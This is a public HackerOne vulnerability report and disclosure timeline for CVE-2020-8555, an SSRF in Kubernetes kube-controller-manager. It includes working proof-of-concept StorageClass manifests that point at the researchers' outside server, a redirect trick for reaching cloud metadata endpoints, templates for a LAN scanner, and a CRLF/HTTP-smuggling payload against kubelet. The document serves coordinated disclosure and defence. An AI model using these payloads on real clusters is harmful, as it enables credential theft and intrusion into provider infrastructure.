---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/cloud
  - stack/kubernetes
  - vuln/ssrf
  - vuln/command-injection
  - vuln/idor
  - vuln/info-disclosure
  - vuln/dos
  - impact/rce
  - impact/internal-network
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2020-10-30
submitted: 2020-01-15T22:33:11.684Z
bounty_usd: 5000
votes: 23
cve: "CVE-2020-8555"
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "reeverzax"
source: "https://hackerone.com/reports/776017"
title: "Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service."
---
# Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.

> **Severity:** High | **Bounty:** 5,000 USD | **Votes:** 23 | **Program:** Kubernetes | **Disclosed:** 2020-10-30

- Report: [https://hackerone.com/reports/776017](https://hackerone.com/reports/776017)
- CWE: Server-Side Request Forgery (SSRF) | CVE: CVE-2020-8555
- Submitted: 2020-01-15T22:33:11.684Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,

## Who we are :

We’re two French security researchers and our respective names are Brice Augras and
Christophe Hauquiert, we worked and found the vulnerability together.

Brice Augras from https://www.groupe-asten.fr/ company - https://hackerone.com/reeverzax
Christophe Hauquiert - https://hackerone.com/hach

## Summary

We recently led some security investigations about Kubernetes product hosted in a managed
service.
By abusing product vulnerability due to implementation context, we would like to bring to your
attention technical details about what we found.
We started an investigation process on multiple managed k8s offers and found quite each time a Critical
Impact vulnerability as this can vary from half-blind SSRF and allow an attacker to perform internal services enumeration inside the distributor perimeter to full SSRF vulnerability .
We're getting in touch with you about the vulnerability you just got aware of two weeks ago from security team we were in touch with.  

## Technical specification : 

- Fake vendor name : **example.com**
- Kubernetes release for half-blind SSRF scenario: **1.14**
- Kubernetes release for complete SSRF vulnerability :  up to **v1.15.3**, **v1.14.6** and **v1.13.10**

We don't know if the previous information regarding k8s release can be useful for you as each distributor seems to manage its own k8s custom cluster release. 
- Attacker server: **https://bzh.ovh** (51.38.238.22)
- Provided file with proof of concept scripts: **PoC.zip**

{F685902}

## Compromission Scenario

Here is the main workflow we followed in order to escape from our customer environment on multiple distributors 
providing k8s managed offer.

Firstly, we created a k8s cluster on distributors managed k8s service.
Mainly, these vendors use the following infrastructure : 

{F685875}

After configuring kubectl binary, we were able to manage our customer cluster provided by **example.com**

When creating a persistent volume claim associated with a custom StorageClass on our
cluster, the provisioning step is handled by the **kube/cloud controller manager** (depending of the release),
we noticed that the process was handled  inside vendor internal perimeter.
We discovered the existence of a half-blind SSRF vulnerability inside multiple
StorageClasses (glusterfs, scaleio, storageos) due to k8s managed context.

This half-blind SSRF can be used us to scan master VPC network and request the different listening services
(Metadata instance, Kubelet, ETCD, etc..) based on the **kube-controller** responses.

Initially, we were only limited to HTTP POST requests as we were unable to retrieve content of
body page if the response code was equal to 200 and not in JSON Content-Type.
But we improved our first payload by combining the previous step with a 302 redirect from an
external server in order to convert POST request to GET request.

In addition to this, if the managed k8s offer service provider was using an old k8s cluster release **AND** allowed customer **kube-controller-manager** logs access, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests and get full HTTP response.
This was the attack scenario with the most impact. 
Indeed, while we were working on our research project, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving via metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc...
 
## PoC
### PoC n°1 - Half Blind SSRF

While doing some analysis on **glusterFS** storage Class Golang source, we noticed that 
the first HTTP request issued during a Volume creation
(https://github.com/heketi/heketi/blob/master/client/api/go-client/volume.go#L34), **/volumes**
was appended at the end of the user provided URL in **resturl** parameter.
In order to remove the end of this unwanted path, we used the **#** trick in the resturl
parameter.
Here is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:

```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: poc-ssrf
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://bzh.ovh:6666/#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "poc-ssrf-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
---
apiVersion: v1
data:
key: bXlwYXNzd29yZA==
kind: Secret
metadata:
name: poc-ssrf-secret
namespace: default
type: kubernetes.io/glusterfs
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: poc-ssrf
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: poc-ssrf
```

We executed the payload with kubectl binary, and the kube-controller-manager handled the
creation process and HTTP request:

```bash
kubectl create -f sc-poc.yam
```
The attacker server was put in listening mode on port 6666 in order to handle incoming
POST requests and verify that how the URL could be arbirary controlled by an attacker:

{F685801}

### PoC n°2 : Redirecting POST to GET HTTP request trick

The first request issued by Glusterfs client was a POST type, by doing the following steps,
we were able to convert POST request to GET:

• Storage class uses http://bzh.ovh/redirect.php# as resturl parameter
• https://bzh.ovh/redirect.php endpoint responds with 302 HTTP return code with the
following Location Header http://169.254.169.254 (could be any other internal
resource, this redirected url is used for example purposes)
• As by default Golang net/http library follows redirection and convert POST to GET
with 302 return code, the targeted resource is then requested with a HTTP GET request.

We were able to read HTTP response body on some requests by describing persistent
volume claim object:
```
kubectl describe pvc xxx
```

Or, getting events from Kubernetes cluster with command below:
```
kubectl get event
```
Here is an example of JSON response we were able to retrieve : 

{F685919}

The exploitation process of our vulnerability at this moment was limited due to the
following elements:
- We were not able to inject HTTP headers in the emitted request
- We were not able to perform POST HTTP Request with body parameters (useful to
request key value on ETCD instance running on 2379 PORT if HTTP unencrypted is used)
- We were not able to retrieve response body content when HTTP return code was
200 and not a JSON Content-Type response.


### PoC n°3 : Managed cluster Lan scanning and sensitive data exposure 

At least, as we had the possibility to scan LAN resources, the next step was automation.
Indeed, in order to scan one IP address and one port we had to realize the following tasks:
- Delete previous tested Storage Class
- Delete previous tested Persistent Volume Claim
- Change IP and PORT in sc.yaml
- Create Storage Class with new IP and port
- Create new Persistent Volume Claim
Since the way to scan for one resource was very specific and incompatible with traditional
SSRF exploitation tools or scanners, we decided to create some kind of custom workers in
bash script.
In order to be able to scan 172.16.0.0/12 range faster, we launched 15 simultaneously workers.
The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range. 
 
Each worker was launched the following command:

{F685904}

Here are two additional YAML files that needs to be in the same directory as scanner.sh Bash
script:
```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: {{SC_NAME}}
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://{{URL}}#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "heketi-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
```
Above is the content of **template_sc.yaml**

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: {{PVC_NAME}}
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: {{SC_NAME}}
```
Above is the content of **template_pvc.yaml**

### PoC n°4  : CRLF + smuggling HTTP injection in old Kubernetes cluster releases 

In addition to all the previous steps, we found a more efficient way to retrieve full HTTP
response body content in addition to craft complete HTTP requests that were user controlled.

Unfortunately, the vulnerability requires the following prerequisites:
- Kube Controller Manager logs reachable by the customer
- Kubernetes Cluster version using Golang version <1.12 (See technical requirements chapter for additional information about specific k8s releases concerned)

We still wan't to bring this attack scenario with a PoC as some providers still have some 
customers using one of these “deprecated” k8s release.

We realized a first PoC in a local environment to demonstrate the vulnerability.
Here are some technical details about them:
We discovered a vulnerability was existing for the following Golang releases <1.12
(https://github.com/golang/go/issues/30794) that allowed to produce HTTP smuggling/CRLF
attacks.
By combining the Half-Blind SSRF described above and the vulnerability, we were able to send complete
crafted requests, including custom headers, HTTP method, parameters and data that were
going to be executed by the **kube-controller-manager**.

In addition to previous steps, we were able to retrieve full HTTP responses from interal requested resource. 

We deployed a local environment simulating Kubernetes exchanges between the GlusterFS
Go client and a fake targeted server. (PoC is http-smuggling-poc in the zip file).

Here is an example of a working StorageClass resturl parameter payload performing an HTTP
smuggling attack + CRLF during provisioning step in order to leak response content in kube-
controller logs:

Here is an example of a working StorageClass **resturl** parameter payload allowing to perform this kind of attack scenario : 

```
http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-
alive\r\nHost: 172.31.X.1:10255\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: 172.31.X.1:10255\r\n\r\n
```

Here is the complete HTTP response that was leaking inside the **lube-controller-manage** logs :

{F685896}

## Impact

## Impact Analysis

This was quite hard for us to evaluate how hard the impact was for these two attack vectors. 
Indeed, as they are vendor dependent, we preferred to take the lowest score we found about impact analysis regarding to whom we reported the security problematic.
Feel free to exchange with us about the **CVSS** score about you consider for this vulnerability as this seems to be related to managed context k8s environment.

From the various distributors we led research on, we noticed that this could lead to  the following impact analysis : 
 
### Integrity

- Lateral movement with cloud steal credentials (from metadata API)
- Remote command execution by using these credentials
- Reproducing above scenario in an IDOR way with other resources discovered in LAN area.

### Confidentiality

- Information gathering by LAN scannin (ssh version, http server versions, ...)
- Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, ...)
- Customers data leak, by using cloud credentials

### Availability

All the post-exploitation scenarios about **integrity** attack vectors could be used to perform disruptive scenarios and make master instance from our customer perimeter or other customer unavailable. 

Indeed, as we are in managed k8senvironment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.

Best Regards, 

Brice Augras from @Groupe-Asten
Christophe Hauquiert

## Timeline

- **Report Filed**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **Report Triaged**
- **2020-01-16** @reeverzax: Hello @tuxedo, 

nice to meet you. 
Thanks for triage and about severity we completely understand that this is not the final version as we're bringing to your attention a quite tricky situation where the impact is related to the third actor (the hosting company).

Feel free to reach us if you wan't additional information about this. 

Have a nice day. 

@reeverzax  & @hach
- **2020-01-16** @tallclair: Thank you for your report. As you mention, the remediation and mitigations of this are complicated due to the dependence on the cluster setup and external environment. We would like to have a longer embargo timeline on this than usual while we coordinate with distributors. We are already coordinating with the Google Cloud and AWS teams. We're currently targeting a mid-March announcement. Are you comfortable with this timeline?

Tim Allclair, on behalf of the Kubernetes Product Security Committee
- **2020-01-21** @reeverzax: Hello @tallclair , 

nice to meet you and sorry for the delay. 
We're completely comfortable with the timeline you requested as we understand that the coordination process with all distributors will represent an important process to handle.

Feel free to give us updates if you need any additional information :)

Best Regards, 

Brice & Christophe
- **2020-03-03** @reeverzax: Hello @tallclair, 

we're getting in touch with you in order to know if you have any news to bring to our attention regarding this case ? 

Thank you and have a nice day :)

Sincerely, 

Brice & Christophe
- **2020-03-04** @lhinds: Hi @reeverzax ,

I can see this case is being finalised internally over the past 24 hours, so hold tight and we will summarise shortly for you!

Luke
- **Bounty Awarded**
- **Bounty Awarded**
- **Cve Id Added**
- **2020-03-04** @reeverzax: Hello, Wow that's a really great news !

Thank you for your feedback and the reward :D ! 

This is quite a complicated case for us as there are multiple companies involved in it. That's the reason why we would like to ask you the following question : 

Are we allowed, without giving details, to answer to the companies we were initially in relation with that there is no "updates on resolution or disclosure timelines yet"  and that they should try to get in touch with Kubernetes Product Security Committee if they wan't to have more specific details ? 

Obviously, since you triaged the vulnerability, we stopped our investigations on the other hosting providers that might be concerned about the root vulnerability.

Once again, thank you very much and have a nice day. 

Best Regards, 

Brice & Christophe.
- **2020-03-04** @tallclair: Yes, please do. They can use CVE-2020-8555 to disambiguate when inquiring about this, and reach out to security-discuss-private@kubernetes.io

Thanks!
- **2020-04-06** @tallclair: The public announcement date for this has been set at June 1st. We've notified our distributors list, and are giving them extra time to patch due to the complexity of the fixes and the current global situation.
- **2020-05-22** @reeverzax: Hello Tim Allclair, 

Hope everything is ok on your side and you're in good health condition. 

We're getting in touch with you in order to know if 1st June is still ok regarding public disclosure on your side (and distributors too) ? 

In addition, Hugues Masselin from HackerOne got in touch with us recently asking us to answer a few questions for their incoming EMEA marketing planned campaign where we're supposed to give testimony as French Elite Hackers :

- What is the most impactful bug you have found? 
- What was your process for finding it?
- What could the consequences have been had the bug been exploited?
-  How common are bugs like these? 
- What are your favourite type of bugs to find? 
- What should companies be most concerned about? 

Through this campaign that will be broadcasted after the 1st of June (we can provide a written acknowledge from HackerOne team), we would like to know if we can freely talk about our research work on Kubernetes security bug (specially for the first three questions).

We already got an approval from Microsoft as a part of this research project was made in their managed service perimeter. 

In addition to this, we're now working on a technical write up on medium about our research work. Would you like us to provide you the draft link before any public disclosure ? 

Have a nice day. 

Best Regards, 

Brice & Christophe.
- **2020-05-28** @tallclair: @reeverzax - Sorry for the delayed response. Yes, we are still planning a public announcement on June 1st, around 9am PT. Please watch https://groups.google.com/g/kubernetes-security-announce for the announcement and do not publish anything before the announcement is made. You may freely discuss the vulnerability, but we would appreciate a draft of the technical details before publishing.

How would you like to be credited? I currently have:
Brice Augras from Groupe-Asten, Christophe Hauquiert
- **2020-05-28** @tallclair: FYI, we've decided to drop the integrity impact to `none`, which downgrades this to a medium (https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N).

Here is a pre-release draft of our planned announcement issue:

---

TITLE: CVE-2020-8555: Half-Blind SSRF in kube/cloud-controller-manager

CVSS Rating: [CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N)

There exists a Server Side Request Forgery (SSRF) vulnerability in kube-controller-manager that allows certain authorized users to leak up to 500 bytes of arbitrary information from unprotected endpoints within the master's host network (such as link-local or loopback services).
 
An attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.
 
### Am I vulnerable?

You may be vulnerable if:

- You are running a vulnerable version (see below)
- There are unprotected endpoints normally only visible from the Kubernetes master (including link-local metadata endpoints, unauthenticated services listening on localhost, or other services in the master's private network)
- Untrusted users can create pods with an affected volume type or modify storage classes.

#### Affected Versions

- kube-controller-manager v1.18.0
- kube-controller-manager v1.17.0 - v1.17.4
- kube-controller-manager v1.16.0 - v1.16.8
- kube-controller-manager < v1.15.11
 
The affected volume types are: GlusterFS, Quobyte, StorageFS, ScaleIO

### How do I mitigate this vulnerability?

Prior to upgrading, this vulnerability can be mitigated by adding endpoint protections on the master or restricting usage of the vulnerable volume types (for example by constraining usage with a [PodSecurityPolicy](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems) or third-party admission controller such as [Gatekeeper](https://github.com/open-policy-agent/gatekeeper)) and restricting StorageClass write permissions through RBAC.

#### Fixed Versions

The information leak was patched in the following versions:

- kube-controller-manager master - fixed by https://github.com/kubernetes/kubernetes/pull/89794
- kube-controller-manager v1.18.1+ - fixed by https://github.com/kubernetes/kubernetes/pull/89796
- kube-controller-manager v1.17.5+ - fixed by https://github.com/kubernetes/kubernetes/pull/89837
- kube-controller-manager v1.16.9+ - fixed by https://github.com/kubernetes/kubernetes/pull/89838
- kube-controller-manager v1.15.12+ - fixed by https://github.com/kubernetes/kubernetes/pull/89839

To upgrade, refer to the documentation: https://kubernetes.io/docs/tasks/administer-cluster/cluster-management/#upgrading-a-cluster

## Additional Details

_Optional details:_
- Vulnerability background
- Technical explanation of vulnerability and/or fix
- Reproduction steps (avoid disclosing unnecessary details)

#### Acknowledgements

This vulnerability was reported by Brice Augras from Groupe-Asten and Christophe Hauquiert
- **2020-05-28** @hach: Hi @tallclair 

Thank you for your response, actually we are still working on the write-up but we can already share a first draft of our work : https://medium.com/@BreizhZeroDayHunters/draft-brice-christophe-publication-1er-juin-technique-8f6b448eafa8

It's not 100% done yet but the different chapters were written done.
Grammar checking + last complete review will be done this week-end so we should be ready for Monday 1st June.
Of course we will wait the announcement before publishing anything.

About credit can you add "from Nokia" after my name ?
`This vulnerability was reported by Brice Augras from Groupe-Asten and Christophe Hauquiert from Nokia`

Brice & Christophe.
- **2020-05-29** @tallclair: Hi @hach, thanks for sharing your draft. I've updated our draft issue to credit you as `from Nokia`.
- **2020-05-29** @hach: Hi @tallclair 

We have additional questions about the CVE draft you sent : 
- ```
An attacker with permissions to create a pod with certain built-in Volume types (GlusterFS, Quobyte, StorageFS, ScaleIO) or permissions to create a StorageClass can cause kube-controller-manager to make GET requests or POST requests without an attacker controlled request body from the master's host network.
```
When we exploited the vulnerability we never needed to create a pod, we just created a malicious storageclass with a PVC using it and that was enough to trigger a dynamic volume provisioning workflow. So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?

- Same question about
 ```
Untrusted users can create pods
```
and
```
(for example by constraining usage with a PodSecurityPolicy
```
Our understanding of PodSecurityPolicy is that it only restricts pod creation/edition process  and not PersistentVolumeClaim resource.  We also read in the documentation "Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.

Brice & Christophe
- **2020-06-01** @hach: Hi @tallclair,

We finished to write our writeup : https://medium.com/@BreizhZeroDayHunters/when-its-not-only-about-a-kubernetes-cve-8f6b448eafa8
We are now waiting for CVE disclosure and we will wait your approval to publish.

Regards,
Brice & Christophe
- **2020-06-01** @tallclair: FYI, announcement is live: https://groups.google.com/d/msg/kubernetes-security-announce/kEK27tqqs30/49XlMZ81AwAJ

> When we exploited the vulnerability we never needed to create a pod, we just created a malicious storageclass with a PVC using it and that was enough to trigger a dynamic volume provisioning workflow. So we don't understand why the CVE is talking about pods, do you have additional information regarding this step ?

Creating a StorageClass is generally considered higher privilege than creating a pod. Our team was able to identify a path to exploit from a pod, but we're not sharing the details right now.

> Our understanding of PodSecurityPolicy is that it only restricts pod creation/edition process and not PersistentVolumeClaim resource. We also read in the documentation "Warning: PodSecurityPolicy does not limit the types of PersistentVolume objects that may be referenced by a PersistentVolumeClaim". Regarding that we don't understand how PSP could mitigate this vulnerability as dynamic volume provisioning is triggered as soon as PVC object is created.

Similarly, creating PVs is typically designated to an admin, so a PSP is a way of preventing less privileged users from exploiting this.
- **2020-06-01** @reeverzax: Hello Tim,

Thank you very much for this technical feedback :) We know better understand the fixing solutions. 

We would like to know if it's possible for you to add the Acknowlegdment part on the Google groups announce?

Thank you  and have a nice day !
- **2020-06-02** @tallclair: The acknowledgement got dropped in an effort to make our announcement emails more concise and streamlined, but I think this was a mistake, and will add it back to our template. That said, because of how widely the email is distributed, I don't want to send the correction on it's own. If there is a follow up, I will include the acknowledgement, and will also add the acknowledgement to the security-discuss thread.
- **2020-06-02** @tallclair: https://groups.google.com/d/msg/kubernetes-security-discuss/J24-PpPXRQ0/O0_lHfLTAgAJ
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
